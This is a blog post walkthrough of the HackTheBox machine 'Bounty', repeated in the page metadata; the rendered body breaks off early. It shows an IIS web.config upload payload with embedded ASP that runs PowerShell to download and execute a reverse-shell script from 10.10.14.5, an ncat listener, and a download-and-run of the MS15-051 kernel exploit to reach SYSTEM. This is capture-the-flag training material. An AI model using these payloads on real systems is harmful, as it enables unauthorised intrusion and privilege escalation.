<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="HTB - Bounty" /><meta name="author" content="QTranspose" /><meta property="og:locale" content="en_US" /><meta name="description" content="Bounty is a vulnerable virtual machine created by mrb3n on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, we discover that the target is a Windows machine with IIS httpd 7.5 running on port 80. 1 2 3 4 5 6 7 8 9 10 11 12 $ nmap -sC -sV -oA recon/default 10.10.10.93 Nmap scan report for 10.10.10.93 Host is up (0.11s latency). Not shown: 999 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: Bounty Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows HTTP We google IIS versions and find that the target OS is Windows Server 2008 R2 according to Wikipedia. On the index page of the web server is just an image merlin.jpg. A ffuf dir fuzzing is performed trying to find interesting directories and files on the server. The wordlist raft-small-words-lowercase.txt is being used because Windows file system is case-insensitive. We will also specify extensions with -e flag. Since it’s IIS on Windows Server 2008 R2, we will want to search .aspx files. 1 2 3 4 5 6 7 8 9 10 11 12 $ ffuf -u http://10.10.10.93/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .aspx -c -v ... [Status: 200, Size: 941, Words: 89, Lines: 22] | URL | http://10.10.10.93/transfer.aspx * FUZZ: transfer.aspx [Status: 301, Size: 156, Words: 9, Lines: 2] | URL | http://10.10.10.93/uploadedfiles | --&gt; | http://10.10.10.93/uploadedfiles/ * FUZZ: uploadedfiles Two interesting findings are shown above. Next, we use our browser to see what they are. While we get a 403 forbidden for the uploadedfiles directory, transfer.aspx gives us a page that seems to be uploading files. We try to upload a txt file with this page, but we get an “Invalid File. Please try again”. We have also tried to upload an aspx shell to see if there is an easy win, but get no luck. 1 $ echo &quot;test&quot; &gt; test.txt To find out what extensions are allowed, we intercept the request with burp, and then send it to intruder. In Positions tab, we specify where the payload should be injected, which is the file extension. In Payloads tab, we choose /usr/share/seclists/Discovery/Web-Content/raft-small-extensions-lowercase.txt as our wordlist. After a while of fuzzing, we see a few responses with a different length. By looking into the response content, we have confirmed that these file types are allowed to upload. In the results, what makes us really curious is that we can upload .config files. Exploitation With some basic searching, we find this blog post, which shows how to achieve RCE by uploading a web.config file to the IIS server. We download the web.config shown in the blog post, and modify it to execute our reverse shell code. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;configuration&gt; &lt;system.webServer&gt; &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt; &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\system32\inetsrv\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt; &lt;/handlers&gt; &lt;security&gt; &lt;requestFiltering&gt; &lt;fileExtensions&gt; &lt;remove fileExtension=&quot;.config&quot; /&gt; &lt;/fileExtensions&gt; &lt;hiddenSegments&gt; &lt;remove segment=&quot;web.config&quot; /&gt; &lt;/hiddenSegments&gt; &lt;/requestFiltering&gt; &lt;/security&gt; &lt;/system.webServer&gt; &lt;appSettings&gt; &lt;/appSettings&gt; &lt;/configuration&gt; &lt;!–- &lt;% Response.write(&quot;-&quot;&amp;&quot;-&gt;&quot;) Response.write(&quot;&lt;pre&gt;&quot;) Set wShell1 = CreateObject(&quot;WScript.Shell&quot;) Set cmd1 = wShell1.Exec(&quot;cmd /c powershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.5:8000/rev.ps1&#39;)&quot;) output1 = cmd1.StdOut.Readall() set cmd1 = nothing: Set wShell1 = nothing Response.write(output1) Response.write(&quot;&lt;/pre&gt;&lt;!-&quot;&amp;&quot;-&quot;) %&gt; -–&gt; Afterwards, we upload the file with the transfer.aspx page. Remember in the early enumeration, we have found an uploadedfiles directory. Our web.config file should now be in that directory. To get our reverse shell, we also need to serve the Invoke-PowerShellTcp.ps1, which is renamed to rev.ps1 and modified to execute the reverse shell code instantly, with python HTTP server. Now that we have everything ready, we simply set up our ncat listener and visit the file at http://10.10.10.93/uploadedfiles/web.config in the browser, and we get a reverse shell. 1 2 3 4 5 6 7 $ rlwrap ncat -nlvp 4444 ... PS C:\windows\system32\inetsrv&gt; whoami whoami bounty\merlin Privilege Escalation After serving the Sherlock.ps1 with our python HTTP server, we run it on the target. The script has found two vulnerabilities, which we have seen quite a few times. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 PS C:\windows\system32\inetsrv&gt; iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.5:8000/sherlock.ps1&#39;) PS C:\windows\system32\inetsrv&gt; find-allvulns ... Title : Task Scheduler .XML MSBulletin : MS10-092 CVEID : 2010-3338, 2010-3888 Link : https://www.exploit-db.com/exploits/19930/ VulnStatus : Appears Vulnerable Title : ClientCopyImage Win32k MSBulletin : MS15-051 CVEID : 2015-1701, 2015-2433 Link : https://www.exploit-db.com/exploits/37367/ VulnStatus : Appears Vulnerable We download the MS15-051 kernel exploit and put it into our HTTP server directory. Then send it to our target. 1 PS C:\windows\system32\inetsrv&gt; (new-object net.webclient).downloadfile(&#39;http://10.10.14.5:8000/ms15051.exe&#39;,&#39;c:\windows\temp\e.exe&#39;) We set up an ncat listener and execute the exploit, and we get a reverse shell with system privileges. 1 2 3 4 5 6 7 8 PS C:\windows\system32\inetsrv&gt; c:\windows\temp\e.exe &quot;powershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.5:8000/rev.ps1&#39;)&quot; $ rlwrap ncat -nlvp 4444 ... PS C:\windows\system32\inetsrv&gt; whoami nt authority\system" /><meta property="og:description" content="Bounty is a vulnerable virtual machine created by mrb3n on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, we discover that the target is a Windows machine with IIS httpd 7.5 running on port 80. 1 2 3 4 5 6 7 8 9 10 11 12 $ nmap -sC -sV -oA recon/default 10.10.10.93 Nmap scan report for 10.10.10.93 Host is up (0.11s latency). Not shown: 999 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: Bounty Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows HTTP We google IIS versions and find that the target OS is Windows Server 2008 R2 according to Wikipedia. On the index page of the web server is just an image merlin.jpg. A ffuf dir fuzzing is performed trying to find interesting directories and files on the server. The wordlist raft-small-words-lowercase.txt is being used because Windows file system is case-insensitive. We will also specify extensions with -e flag. Since it’s IIS on Windows Server 2008 R2, we will want to search .aspx files. 1 2 3 4 5 6 7 8 9 10 11 12 $ ffuf -u http://10.10.10.93/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .aspx -c -v ... [Status: 200, Size: 941, Words: 89, Lines: 22] | URL | http://10.10.10.93/transfer.aspx * FUZZ: transfer.aspx [Status: 301, Size: 156, Words: 9, Lines: 2] | URL | http://10.10.10.93/uploadedfiles | --&gt; | http://10.10.10.93/uploadedfiles/ * FUZZ: uploadedfiles Two interesting findings are shown above. Next, we use our browser to see what they are. While we get a 403 forbidden for the uploadedfiles directory, transfer.aspx gives us a page that seems to be uploading files. We try to upload a txt file with this page, but we get an “Invalid File. Please try again”. We have also tried to upload an aspx shell to see if there is an easy win, but get no luck. 1 $ echo &quot;test&quot; &gt; test.txt To find out what extensions are allowed, we intercept the request with burp, and then send it to intruder. In Positions tab, we specify where the payload should be injected, which is the file extension. In Payloads tab, we choose /usr/share/seclists/Discovery/Web-Content/raft-small-extensions-lowercase.txt as our wordlist. After a while of fuzzing, we see a few responses with a different length. By looking into the response content, we have confirmed that these file types are allowed to upload. In the results, what makes us really curious is that we can upload .config files. Exploitation With some basic searching, we find this blog post, which shows how to achieve RCE by uploading a web.config file to the IIS server. We download the web.config shown in the blog post, and modify it to execute our reverse shell code. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;configuration&gt; &lt;system.webServer&gt; &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt; &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\system32\inetsrv\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt; &lt;/handlers&gt; &lt;security&gt; &lt;requestFiltering&gt; &lt;fileExtensions&gt; &lt;remove fileExtension=&quot;.config&quot; /&gt; &lt;/fileExtensions&gt; &lt;hiddenSegments&gt; &lt;remove segment=&quot;web.config&quot; /&gt; &lt;/hiddenSegments&gt; &lt;/requestFiltering&gt; &lt;/security&gt; &lt;/system.webServer&gt; &lt;appSettings&gt; &lt;/appSettings&gt; &lt;/configuration&gt; &lt;!–- &lt;% Response.write(&quot;-&quot;&amp;&quot;-&gt;&quot;) Response.write(&quot;&lt;pre&gt;&quot;) Set wShell1 = CreateObject(&quot;WScript.Shell&quot;) Set cmd1 = wShell1.Exec(&quot;cmd /c powershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.5:8000/rev.ps1&#39;)&quot;) output1 = cmd1.StdOut.Readall() set cmd1 = nothing: Set wShell1 = nothing Response.write(output1) Response.write(&quot;&lt;/pre&gt;&lt;!-&quot;&amp;&quot;-&quot;) %&gt; -–&gt; Afterwards, we upload the file with the transfer.aspx page. Remember in the early enumeration, we have found an uploadedfiles directory. Our web.config file should now be in that directory. To get our reverse shell, we also need to serve the Invoke-PowerShellTcp.ps1, which is renamed to rev.ps1 and modified to execute the reverse shell code instantly, with python HTTP server. Now that we have everything ready, we simply set up our ncat listener and visit the file at http://10.10.10.93/uploadedfiles/web.config in the browser, and we get a reverse shell. 1 2 3 4 5 6 7 $ rlwrap ncat -nlvp 4444 ... PS C:\windows\system32\inetsrv&gt; whoami whoami bounty\merlin Privilege Escalation After serving the Sherlock.ps1 with our python HTTP server, we run it on the target. The script has found two vulnerabilities, which we have seen quite a few times. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 PS C:\windows\system32\inetsrv&gt; iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.5:8000/sherlock.ps1&#39;) PS C:\windows\system32\inetsrv&gt; find-allvulns ... Title : Task Scheduler .XML MSBulletin : MS10-092 CVEID : 2010-3338, 2010-3888 Link : https://www.exploit-db.com/exploits/19930/ VulnStatus : Appears Vulnerable Title : ClientCopyImage Win32k MSBulletin : MS15-051 CVEID : 2015-1701, 2015-2433 Link : https://www.exploit-db.com/exploits/37367/ VulnStatus : Appears Vulnerable We download the MS15-051 kernel exploit and put it into our HTTP server directory. Then send it to our target. 1 PS C:\windows\system32\inetsrv&gt; (new-object net.webclient).downloadfile(&#39;http://10.10.14.5:8000/ms15051.exe&#39;,&#39;c:\windows\temp\e.exe&#39;) We set up an ncat listener and execute the exploit, and we get a reverse shell with system privileges. 1 2 3 4 5 6 7 8 PS C:\windows\system32\inetsrv&gt; c:\windows\temp\e.exe &quot;powershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.5:8000/rev.ps1&#39;)&quot; $ rlwrap ncat -nlvp 4444 ... PS C:\windows\system32\inetsrv&gt; whoami nt authority\system" /><link rel="canonical" href="https://qtranspose.xyz/posts/htb-bounty/" /><meta property="og:url" content="https://qtranspose.xyz/posts/htb-bounty/" /><meta property="og:site_name" content="QTranspose" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-02-06T00:00:00+11:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HTB - Bounty" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@QTranspose" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Bounty is a vulnerable virtual machine created by mrb3n on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, we discover that the target is a Windows machine with IIS httpd 7.5 running on port 80. 1 2 3 4 5 6 7 8 9 10 11 12 $ nmap -sC -sV -oA recon/default 10.10.10.93 Nmap scan report for 10.10.10.93 Host is up (0.11s latency). Not shown: 999 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: Bounty Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows HTTP We google IIS versions and find that the target OS is Windows Server 2008 R2 according to Wikipedia. On the index page of the web server is just an image merlin.jpg. A ffuf dir fuzzing is performed trying to find interesting directories and files on the server. The wordlist raft-small-words-lowercase.txt is being used because Windows file system is case-insensitive. We will also specify extensions with -e flag. Since it’s IIS on Windows Server 2008 R2, we will want to search .aspx files. 1 2 3 4 5 6 7 8 9 10 11 12 $ ffuf -u http://10.10.10.93/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .aspx -c -v ... [Status: 200, Size: 941, Words: 89, Lines: 22] | URL | http://10.10.10.93/transfer.aspx * FUZZ: transfer.aspx [Status: 301, Size: 156, Words: 9, Lines: 2] | URL | http://10.10.10.93/uploadedfiles | --&gt; | http://10.10.10.93/uploadedfiles/ * FUZZ: uploadedfiles Two interesting findings are shown above. Next, we use our browser to see what they are. While we get a 403 forbidden for the uploadedfiles directory, transfer.aspx gives us a page that seems to be uploading files. We try to upload a txt file with this page, but we get an “Invalid File. Please try again”. We have also tried to upload an aspx shell to see if there is an easy win, but get no luck. 1 $ echo &quot;test&quot; &gt; test.txt To find out what extensions are allowed, we intercept the request with burp, and then send it to intruder. In Positions tab, we specify where the payload should be injected, which is the file extension. In Payloads tab, we choose /usr/share/seclists/Discovery/Web-Content/raft-small-extensions-lowercase.txt as our wordlist. After a while of fuzzing, we see a few responses with a different length. By looking into the response content, we have confirmed that these file types are allowed to upload. In the results, what makes us really curious is that we can upload .config files. Exploitation With some basic searching, we find this blog post, which shows how to achieve RCE by uploading a web.config file to the IIS server. We download the web.config shown in the blog post, and modify it to execute our reverse shell code. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;configuration&gt; &lt;system.webServer&gt; &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt; &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\\system32\\inetsrv\\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt; &lt;/handlers&gt; &lt;security&gt; &lt;requestFiltering&gt; &lt;fileExtensions&gt; &lt;remove fileExtension=&quot;.config&quot; /&gt; &lt;/fileExtensions&gt; &lt;hiddenSegments&gt; &lt;remove segment=&quot;web.config&quot; /&gt; &lt;/hiddenSegments&gt; &lt;/requestFiltering&gt; &lt;/security&gt; &lt;/system.webServer&gt; &lt;appSettings&gt; &lt;/appSettings&gt; &lt;/configuration&gt; &lt;!–- &lt;% Response.write(&quot;-&quot;&amp;&quot;-&gt;&quot;) Response.write(&quot;&lt;pre&gt;&quot;) Set wShell1 = CreateObject(&quot;WScript.Shell&quot;) Set cmd1 = wShell1.Exec(&quot;cmd /c powershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.5:8000/rev.ps1&#39;)&quot;) output1 = cmd1.StdOut.Readall() set cmd1 = nothing: Set wShell1 = nothing Response.write(output1) Response.write(&quot;&lt;/pre&gt;&lt;!-&quot;&amp;&quot;-&quot;) %&gt; -–&gt; Afterwards, we upload the file with the transfer.aspx page. Remember in the early enumeration, we have found an uploadedfiles directory. Our web.config file should now be in that directory. To get our reverse shell, we also need to serve the Invoke-PowerShellTcp.ps1, which is renamed to rev.ps1 and modified to execute the reverse shell code instantly, with python HTTP server. Now that we have everything ready, we simply set up our ncat listener and visit the file at http://10.10.10.93/uploadedfiles/web.config in the browser, and we get a reverse shell. 1 2 3 4 5 6 7 $ rlwrap ncat -nlvp 4444 ... PS C:\\windows\\system32\\inetsrv&gt; whoami whoami bounty\\merlin Privilege Escalation After serving the Sherlock.ps1 with our python HTTP server, we run it on the target. The script has found two vulnerabilities, which we have seen quite a few times. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 PS C:\\windows\\system32\\inetsrv&gt; iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.5:8000/sherlock.ps1&#39;) PS C:\\windows\\system32\\inetsrv&gt; find-allvulns ... Title : Task Scheduler .XML MSBulletin : MS10-092 CVEID : 2010-3338, 2010-3888 Link : https://www.exploit-db.com/exploits/19930/ VulnStatus : Appears Vulnerable Title : ClientCopyImage Win32k MSBulletin : MS15-051 CVEID : 2015-1701, 2015-2433 Link : https://www.exploit-db.com/exploits/37367/ VulnStatus : Appears Vulnerable We download the MS15-051 kernel exploit and put it into our HTTP server directory. Then send it to our target. 1 PS C:\\windows\\system32\\inetsrv&gt; (new-object net.webclient).downloadfile(&#39;http://10.10.14.5:8000/ms15051.exe&#39;,&#39;c:\\windows\\temp\\e.exe&#39;) We set up an ncat listener and execute the exploit, and we get a reverse shell with system privileges. 1 2 3 4 5 6 7 8 PS C:\\windows\\system32\\inetsrv&gt; c:\\windows\\temp\\e.exe &quot;powershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.5:8000/rev.ps1&#39;)&quot; $ rlwrap ncat -nlvp 4444 ... PS C:\\windows\\system32\\inetsrv&gt; whoami nt authority\\system","@type":"BlogPosting","headline":"HTB - Bounty","dateModified":"2021-03-07T13:07:33+11:00","datePublished":"2021-02-06T00:00:00+11:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://qtranspose.xyz/posts/htb-bounty/"},"author":{"@type":"Person","name":"QTranspose"},"url":"https://qtranspose.xyz/posts/htb-bounty/","@context":"https://schema.org"}</script><title>HTB - Bounty | QTranspose</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/qtranspose.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">QTranspose</a></div><div class="site-subtitle font-italic">Rock The Matrix</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/QTranspose" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://app.hackthebox.eu/profile/112476" aria-label="hackthebox" class="order-4" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HTB - Bounty</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HTB - Bounty</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Feb 6, 2021, 12:00 AM +1100" > Feb 6 <i class="unloaded">2021-02-06T00:00:00+11:00</i> </span> by <span class="author"> QTranspose </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Mar 7, 2021, 1:07 PM +1100" > Mar 7 <i class="unloaded">2021-03-07T13:07:33+11:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="831 words">4 min</span></div></div><div class="post-content"><p>Bounty is a vulnerable virtual machine created by mrb3n on HackTheBox. In this post, we document a complete walkthrough of pwning this machine.</p><h2 id="enumeration">Enumeration</h2><h3 id="nmap">Nmap</h3><p>Starting off with the <code class="language-plaintext highlighter-rouge">nmap</code> scan, we discover that the target is a Windows machine with <code class="language-plaintext highlighter-rouge">IIS httpd 7.5</code> running on port 80.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>$ nmap -sC -sV -oA recon/default 10.10.10.93

Nmap scan report for 10.10.10.93
Host is up (0.11s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</pre></table></code></div></div><h3 id="http">HTTP</h3><p>We google <code class="language-plaintext highlighter-rouge">IIS</code> versions and find that the target OS is <code class="language-plaintext highlighter-rouge">Windows Server 2008 R2</code> according to <a href="https://en.wikipedia.org/wiki/Internet_Information_Services">Wikipedia</a>.</p><p>On the index page of the web server is just an image <code class="language-plaintext highlighter-rouge">merlin.jpg</code>. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-bounty/http.jpg" alt="" /></p><p>A <code class="language-plaintext highlighter-rouge">ffuf</code> dir fuzzing is performed trying to find interesting directories and files on the server. The wordlist <code class="language-plaintext highlighter-rouge">raft-small-words-lowercase.txt</code> is being used because Windows file system is case-insensitive. We will also specify extensions with <code class="language-plaintext highlighter-rouge">-e</code> flag. Since it’s <code class="language-plaintext highlighter-rouge">IIS</code> on Windows Server 2008 R2, we will want to search <code class="language-plaintext highlighter-rouge">.aspx</code> files.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
